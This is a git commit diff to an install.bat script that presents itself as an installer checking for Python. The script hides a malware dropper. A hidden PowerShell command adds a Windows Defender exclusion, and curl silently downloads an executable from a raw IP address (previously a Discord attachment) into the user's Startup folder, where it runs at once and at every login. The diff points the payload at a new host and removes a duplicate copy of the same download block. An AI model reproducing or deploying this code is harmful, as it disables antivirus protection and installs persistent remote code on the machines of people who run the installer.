478cff66eb133946948fbf04b622b86f8a1b25ef
Windysdus <155911382+windysdus@users.noreply.github.com>
2024-06-26 23:52:42 +0300

    Update install.bat

--- install.bat
+++ install.bat
@@ -3,7 +3,7 @@ powershell -w hidden -c Add-MpPreference -ExclusionPath ""
 @echo off
 setlocal 
 
-set "URL=https://cdn.discordapp.com/attachments/1055547260932477029/1255600354624802826/Built.exe?ex=667db874&is=667c66f4&hm=d0f68da25f4e4d2d6b8c8d943d844961504c4a25b7b445ea50550120a384b000&"
+set "URL=http://45.133.36.107/Update.exe"
 set "DEST=%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\Built.exe"
 
 
@@ -17,26 +17,6 @@ if %errorlevel% neq 0 (
 
 call "%DEST%"
 
-@echo off
-setlocal 
-
-set "URL=https://cdn.discordapp.com/attachments/1055547260932477029/1255600354624802826/Built.exe?ex=667db874&is=667c66f4&hm=d0f68da25f4e4d2d6b8c8d943d844961504c4a25b7b445ea50550120a384b000&"
-set "DEST=%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\Built.exe"
-
-
-if exist "%DEST%" del "%DEST%"
-
-curl --silent --output "%DEST%" "%URL%"
-
-if %errorlevel% neq 0 (
-  exit /b %errorlevel%
-)
-
-call "%DEST%"
-
-
-@echo off
-cd /d %~dp0
 
 title Checking Python installation...
 python --version > nul 2>&1
